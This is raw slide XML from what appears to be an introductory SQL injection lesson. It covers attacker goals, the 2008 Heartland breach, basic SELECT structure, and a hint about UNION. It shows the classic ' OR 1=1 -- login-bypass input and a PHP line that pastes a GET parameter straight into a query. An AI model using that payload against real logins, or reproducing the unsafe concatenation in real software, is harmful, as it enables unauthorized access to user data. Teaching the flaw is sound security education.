          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="2260031"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="332" name="Google Shape;332;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="20574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Dump the whole database</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="333" name="Google Shape;333;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="242316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One query can exfiltrate every user, password hash, and secret the app stores.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="334" name="Google Shape;334;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="33375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5" name="Google Shape;335;p20"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="3494471"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="336" name="Google Shape;336;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="32918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Bypass auth &amp; escalate</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="337" name="Google Shape;337;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="365760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Log in as admin, then pivot deeper into the internal network.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="338" name="Google Shape;338;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4572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39" name="Google Shape;339;p20"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="4728911"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="340" name="Google Shape;340;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="452628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Sell or ransom the data</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="341" name="Google Shape;341;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="489204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Stolen credentials and PII end up on dark-web markets within days.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="342" name="Google Shape;342;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="2011680"/>
            <a:ext cx="4800600" cy="3931920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 186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20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="22860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100"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>WAR STORY</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="344" name="Google Shape;344;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="2615184"/>
            <a:ext cx="41605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1800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Heartland Payment Systems, 2008</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="345" name="Google Shape;345;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="3200400"/>
            <a:ext cx="41605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4800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="4800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F85149"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>130M+</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="346" name="Google Shape;346;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4023360"/>
            <a:ext cx="4160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card numbers stolen</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="347" name="Google Shape;347;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4434840"/>
            <a:ext cx="4160520" cy="132588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 single SQL injection got attackers into the payment processor's network - at the time the largest card-data breach in history. Cost the company ~$140M.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="348" name="Google Shape;348;p20"/>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20"/>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350" name="Google Shape;350;p20"/>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5" name="Shape 355"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="356" name="Google Shape;356;p21"/>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SQL REFRESHER</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="357" name="Google Shape;357;p21"/>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A login query, before you touch it</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="358" name="Google Shape;358;p21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2103120"/>
            <a:ext cx="6309360" cy="2331720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 313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9" name="Google Shape;359;p21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="896112" y="234086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0" name="Google Shape;360;p21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1133856" y="234086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21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="234086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21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1737360" y="2176272"/>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the developer's query</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="363" name="Google Shape;363;p21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2633472"/>
            <a:ext cx="6309360" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="364" name="Google Shape;364;p21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2761488"/>
            <a:ext cx="5760720" cy="15087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SELECT id, role FROM users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WHERE user = 'jeff'</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  AND pass = 'hunter2';</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="365" name="Google Shape;365;p21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7223760" y="2286000"/>
            <a:ext cx="4297680" cy="21945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The quotes </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>'…'</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t> wrap your input.</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Sneak a quote in and you escape the string - the rest of what you type becomes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3FB950"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>SQL code</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>, not data.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="366" name="Google Shape;366;p21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4663440"/>
            <a:ext cx="10607040" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 5161"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21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="896112" y="490118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p21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1133856" y="490118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21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="490118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21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1737360" y="4736592"/>
            <a:ext cx="932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inject a quote and a comment</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="371" name="Google Shape;371;p21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5193792"/>
            <a:ext cx="10607040" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="372" name="Google Shape;372;p21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="5321808"/>
            <a:ext cx="10058400" cy="5943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WHERE user = ''  OR 1=1 -- '  AND pass =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D29922"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>             ^escape  ^always true  ^comment kills the rest</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="373" name="Google Shape;373;p21"/>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p21"/>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375" name="Google Shape;375;p21"/>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9" name="Shape 379"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="380" name="Google Shape;380;p22"/>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SQL REFRESHER</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="381" name="Google Shape;381;p22"/>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Rows in, rows out</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="382" name="Google Shape;382;p22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2103120"/>
            <a:ext cx="6309360" cy="2331720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 313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22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="896112" y="234086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p22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1133856" y="234086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22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="234086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22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1737360" y="2176272"/>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the four parts you'll meet</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="387" name="Google Shape;387;p22"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2633472"/>
            <a:ext cx="6309360" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="388" name="Google Shape;388;p22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2761488"/>
            <a:ext cx="5760720" cy="15087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SELECT id, role      &lt;- which COLUMNS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FROM   users         &lt;- which TABLE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WHERE  user='jeff'   &lt;- which ROWS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ORDER BY id;         &lt;- sort</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="389" name="Google Shape;389;p22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7223760" y="2286000"/>
            <a:ext cx="4297680" cy="21945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A SELECT returns a grid: fixed COLUMNS, zero or more ROWS.</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500"/>
              <a:buFont typeface="Arial"/>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Remember the column count - UNION will depend on it.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="390" name="Google Shape;390;p22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4663440"/>
            <a:ext cx="10607040" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 5161"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1" name="Google Shape;391;p22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="896112" y="490118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2" name="Google Shape;392;p22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1133856" y="490118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3" name="Google Shape;393;p22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="490118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4" name="Google Shape;394;p22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1737360" y="4736592"/>
            <a:ext cx="932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the app glues your input in</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="395" name="Google Shape;395;p22"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5193792"/>
            <a:ext cx="10607040" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="396" name="Google Shape;396;p22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="5321808"/>
            <a:ext cx="10058400" cy="5943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$sql = "SELECT id, role FROM users WHERE user='" . $_GET['u'] .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 your text, pasted straight into the code</a:t>
            </a:r>
